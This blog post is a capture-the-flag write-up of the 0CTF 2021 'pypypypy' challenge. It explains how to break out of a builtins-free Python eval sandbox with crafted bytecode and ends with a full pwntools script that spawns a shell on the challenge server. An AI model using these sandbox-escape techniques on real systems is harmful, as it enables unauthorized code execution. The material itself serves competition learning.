---
layout: post
title: "0CTF 2021 / pypypypy"
permalink: /0ctf-2021-pypypypy
---

This was a really well-designed challenge which we enjoyed a lot. The goal was
to run arbitrary bytecode inside `eval` without having `__builtins__`. Since
the code object is created by the remote script, we don't have `co_consts` and
`co_names`. However, the author gifts us two magic names.

Let's take a look at the remote script:

```python
# 3.8.11 (default, Jun 29 2021, 19:54:56)
# [GCC 8.3.0]
import sys
from pathlib import Path
from types import CodeType

src = Path(__file__).read_text()

print(sys.version)
print(src)

codestring = bytes.fromhex(input('Give me your bytecode in hex:'))
assert len(codestring) <= 2000, 'Too long!'

print('Thanks!')
print('I will give you two gifts in exhange, what do you want?')

gift1 = input('gift1: ')
gift2 = input('gift2: ')
assert len(gift1) <= 10, 'Too long!'
assert len(gift2) <= 10, 'Too long!'

code = CodeType(0, 0, 0, 0, 0, 0, codestring, (), (f'__{gift1}__', f'__{gift2}__'), (), '', '', 0, b'')

result = eval(code, {'__builtins__': None}, {})
print('success, bye!')
```

At first our plan was calling `os.system('sh')` like this:

```python
typ = None.__getattribute__('__class__')
obj = typ.__getattribute__(typ, '__base__')
sub = obj.__getattribute__(obj, '__subclasses__')()
wrap = sub[133]
ini = wrap.__getattribute__(wrap, '__init__')
glb = ini.__getattribute__('__globals__')
glb["system"]("sh")
```

And we were thinking about setting gifts to `__getattribute__` and `__len__`.
The point of `__len__` is to generate numbers since we don't have `co_consts`.
However, we realized that `getattribute` is too long and won't get accepted.

After spending some time, we decided to use `__class__` and `__dict__` as gifts.
The point is we can call `__getattribute__` by combining them like this:

```python
getattribute: a.__class__.__dict__["__getattribute__"]
```

Even though we realized that we don't need `None`, it can be obtained like

```python
None: {}.__class__.__dict__["get"]({}, "")
```

or

```python
None: [].__class__.__dict__["clear"]([])
```

After deciding which gifts to use, we realized that we need to find a way to
generate arbitrary numbers and strings. Since we didn't have `__len__` anymore,
we needed another trick to generate numbers. Then, we came up with this trick:

```python
False: '' != ''
True: '' == ''

0: False + False
1: False + True
```

Here is [@liangjs](//github.com/liangjs)'s amazing function to calculate all
numbers in an efficient way:

```python
def gen_int(x: int):
    if x == 0:
        return gen_zero()
    if x < 0:
        return gen_int(-x) + bytes([opmap["UNARY_NEGATIVE"], 0])
    b = bin(x)[2:]
    b = b[::-1]
    n = len(b)
    ans = gen_one()
    for i in range(n-1):
        if b[i] == '1':
            ans += dup_top()
        ans += dup_top()
        ans += bytes([opmap["BINARY_ADD"], 0])
    for i in range(n-1):
        if b[i] == '1':
            ans += bytes([opmap["BINARY_ADD"], 0])
    return ans
```

Now we have access to numbers, we just need arbitrary strings. We were stuck
at this point for a while since we don't have access to `__str__` until
[@Anciety](//github.com/Escapingbug) found that we can use `FORMAT_VALUE` opcode
to format objects to `str`. Using this advice I came up with the following:

```python
>>> sorted(set(f"{''.__class__.__dict__}"))
[' ', '"', "'", '(', ')', ',', '-', '.', '0', '2', '3', '4', '5', '6', '7', '8', ':', '<', '=', '>', 'C', 'I', 'O', '[', '\\', ']', '_', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '}']
```

As you can see, we have lots of chars available in `f"{''.__class__.dict__}"`
and we can create a function to generate chars by getting this string and using
index accesses to retrieve chars on top of the stack. Finally we can use
`BUILD_STRING(n)` to generate a string. This trick works but getting chars one
by one is inefficient and it makes our payload to grow >= 2000 bytes.

Again @liangjs being a life-saver, decided to use slices instead of indexes.
We just needed some strings that contain the strings we want as a substring.
For example, `f"{''.__class__.__class__.__dict__}"` contains `__init__`,
`__getattribute__`, `__base__`, etc.

Now, we are ready to revise our initial strategy:

```python
typ = ''.__class__.__class__
obj = typ.__dict__['__getattribute__'](typ, '__base__')
sub = obj.__dict__['__getattribute__'](obj, '__subclasses__')()
wrap = sub[133]
ini = wrap.__class__.__dict__['__getattribute__'](wrap, '__init__')
```

However, after getting to `os._wrap_close.__init__`, we can't use
```python
glb = ini.__class__.__dict__['__getattribute__'](ini, '__globals__')
```
to get `__globals__` for some reason. But, we found that `operator.attrgetter`
was available in subclasses. Using that it is possible to get globals. So, our
strategy continued like this:

```python
attrgetter = sub[148]
glb = attrgetter('__globals__')(ini)
glb["system"]("sh")
```

Another problem was passing the object itself as a parameter to these function
calls. However, we realized that both `__class__` and `__dict__` weren't used as
names in the global scope which means that we could use them as variable names
to store/load objects and values without having any other issue.

At this point we had our exploit working locally. However, it failed on the
remote server since the index values in subclasses weren't the same. We decided
to cause `KeyError` exception using an empty map object. Since the key was
printed back in the error message we decided to use format string as key to dump
the contents of `object.__subclasses__()` like this:

```python
{}[f"{sub}"]
```

After correcting the index values for `os._wrap_close` and
`operator.attrgetter`, we finally got the flag.

Here is our complete solution script:

```python
from pwn import *
from opcode import opmap, cmp_op
import os


def gen_None():
    return \
        bytes([opmap["BUILD_LIST"], 0]) + \
        get_class() + \
        get_dict() + \
        gen_string("clear") + \
        bytes([opmap["BINARY_SUBSCR"], 0]) + \
        bytes([opmap["BUILD_LIST"], 0]) + \
        call_function(1)


def gen_return():
    return bytes([opmap["RETURN_VALUE"], 0])


def get_class():
    return bytes([opmap["LOAD_ATTR"], 0])


def get_dict():
    return bytes([opmap["LOAD_ATTR"], 1])


def gen_true():
    return \
        gen_empty_str() + \
        gen_empty_str() + \
        bytes([opmap["COMPARE_OP"], cmp_op.index("==")])


def gen_false():
    return \
        gen_empty_str() + \
        gen_empty_str() + \
        bytes([opmap["COMPARE_OP"], cmp_op.index("!=")])


def gen_zero():
    return \
        gen_false() + \
        gen_false() + \
        bytes([opmap["BINARY_ADD"], 0])


def gen_one():
    return \
        gen_true() + \
        gen_false() + \
        bytes([opmap["BINARY_ADD"], 0])


def dup_top():
    return bytes([opmap["DUP_TOP"], 0])


def gen_int(x: int):
    if x == 0:
        return gen_zero()
    if x < 0:
        return gen_int(-x) + bytes([opmap["UNARY_NEGATIVE"], 0])
    b = bin(x)[2:]
    b = b[::-1]
    n = len(b)
    ans = gen_one()
    for i in range(n-1):
        if b[i] == '1':
            ans += dup_top()
        ans += dup_top()
        ans += bytes([opmap["BINARY_ADD"], 0])
    for i in range(n-1):
        if b[i] == '1':
            ans += bytes([opmap["BINARY_ADD"], 0])
    return ans


def gen_empty_str():
    return bytes([opmap["BUILD_STRING"], 0])


def gen_char(c):
    s = f"{''.__class__.__dict__}"
    if c not in s:
        raise ValueError()
    idx = s.index(c)
    return \
        gen_empty_str() + \
        get_class() + \
        get_dict() + \
        bytes([opmap["FORMAT_VALUE"], 1]) + \
        gen_int(idx) + \
        bytes([opmap["BINARY_SUBSCR"], 0])


def gen_string(helper, s: str):
    hint, code = helper()
    shint = f'{hint}'
    idx = shint.find(s)
    return code + \
        bytes([opmap["FORMAT_VALUE"], 1]) + \
        gen_int(idx) + \
        gen_int(idx + len(s)) + \
        bytes([opmap["BUILD_SLICE"], 2]) + \
        bytes([opmap["BINARY_SUBSCR"], 0])


def str_helper1():
    # __base__, __subclassess__, __init__, __getattribute__
    hint = ''.__class__.__class__.__dict__
    code = \
        gen_empty_str() + \
        get_class() + \
        get_class() + \
        get_dict()
    return hint, code


def str_helper2():
    # __globals__
    hint = os._wrap_close.__init__.__class__.__dict__
    code = \
        b"" + \
        get_class() + \
        get_dict()
    return hint, code


def str_helper3():
    # system
    hint = os._wrap_close.__init__.__globals__
    code = b""
    return hint, code


def str_helper4():
    # sh
    hint = ''.__class__.__dict__
    code = \
        gen_empty_str() + \
        get_class() + \
        get_dict()
    return hint, code


def call_method(x):
    return bytes([opmap["CALL_METHOD"], x])


def call_function(x):
    return bytes([opmap["CALL_FUNCTION"], x])


def save_var(x):
    return bytes([opmap["STORE_NAME"], x])


def load_var(x):
    return bytes([opmap["LOAD_NAME"], x])


def binary_subscr():
    return bytes([opmap["BINARY_SUBSCR"], 0])


def get_code():
    code = b""

    # <class 'type'>
    code += gen_empty_str()
    code += get_class()
    code += get_class()

    # <class 'object'>
    code += save_var(1)
    code += load_var(1)
    code += get_dict()
    code += gen_string(str_helper1, '__getattribute__')
    code += binary_subscr()
    code += load_var(1)
    code += gen_string(str_helper1, '__base__')
    code += call_function(2)

    # object.__subclassess__()
    code += save_var(1)
    code += load_var(1)
    code += get_dict()
    code += gen_string(str_helper1, '__getattribute__')
    code += binary_subscr()
    code += load_var(1)
    code += gen_string(str_helper1, '__subclasses__')
    code += call_function(2)
    code += call_function(0)

    # save subclasses
    code += save_var(0)

    """
    # exception
    code += bytes([opmap["BUILD_MAP"], 0])
    code += load_var(0)
    code += bytes([opmap["FORMAT_VALUE"], 1])
    code += binary_subscr()
    """

    # <class 'os._wrap_close'>
    code += load_var(0)
    code += gen_int(133) # 133
    code += binary_subscr()

    # _wrap_close.__init__
    code += save_var(1)
    code += load_var(1)
    code += get_class()
    code += get_dict()
    code += gen_string(str_helper1, '__getattribute__')
    code += binary_subscr()
    code += load_var(1)
    code += gen_string(str_helper1, '__init__')
    code += call_function(2)

    # __globals__
    code += save_var(1) # save init
    code += load_var(0) # load attrgetter
    code += gen_int(148) # 168
    code += binary_subscr() # attrgetter
    code += load_var(1) # load init
    code += gen_string(str_helper2, '__globals__')
    code += call_function(1)
    code += load_var(1) # load init
    code += call_function(1)

    # globals["system"]("sh")
    code += save_var(1)
    code += load_var(1)
    code += load_var(1)
    code += gen_string(str_helper3, "system")
    code += binary_subscr()
    code += gen_string(str_helper4, "sh")
    code += call_function(1)

    code += gen_return()

    assert len(code) <= 2000
    hex_code = ''.join('%02x' % x for x in code)
    return hex_code


def main():
    gift1 = 'class'
    gift2 = 'dict'
    code = get_code()

    r = remote("111.186.58.164", 13337)
    r.recvuntil("in hex", timeout=1)
    r.recvuntil("in hex", timeout=1)
    r.sendline(code)
    r.recvuntil("gift1", timeout=1)
    r.sendline(gift1)
    r.recvuntil("gift2", timeout=1)
    r.sendline(gift2)
    r.interactive()


if __name__ == '__main__':
    main()
```
